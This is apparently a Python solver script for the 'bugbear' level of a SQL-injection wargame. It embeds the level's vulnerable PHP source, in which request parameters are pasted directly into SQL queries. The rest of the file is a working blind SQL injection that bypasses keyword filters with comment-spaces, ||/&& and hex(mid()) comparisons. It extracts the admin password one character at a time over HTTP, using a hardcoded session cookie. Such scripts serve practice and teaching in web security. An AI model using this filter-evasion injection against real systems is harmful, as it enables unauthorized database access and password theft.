import requests
import time
import string
"""
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
"""

url = "https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php"
strings = string.printable
password = ""
#payload = {"pw":"","no":'1/**/||/**/id/**/in("admin")/**/&&/**/length(pw)/**/in(8)'}  use in() instead of like, =
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
for i in range(8):
    for j in strings:
        payload = {"pw":password,"no":'1/**/||/**/id/**/in("admin")/**/&&/**/hex(mid(pw,'+str(i+1)+',1))/**/in('+ hex(ord(j))[2:]+')'} #hex() returns a hex value that doesn't include '0x'
        cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
        r = requests.get(url,params=payload,cookies=cookie)
        #print(r.text)
        if 'Hello admin' in r.text:
            password += j
            print("found {}".format(password))
            if len(password) == 8:
                payload = {"pw": password}
                r = requests.get(url,params=payload,cookies=cookie)
                if "Clear" in r.text:
                    print("clear")
                else:
                    print("try again")
            break
        time.sleep(0.5)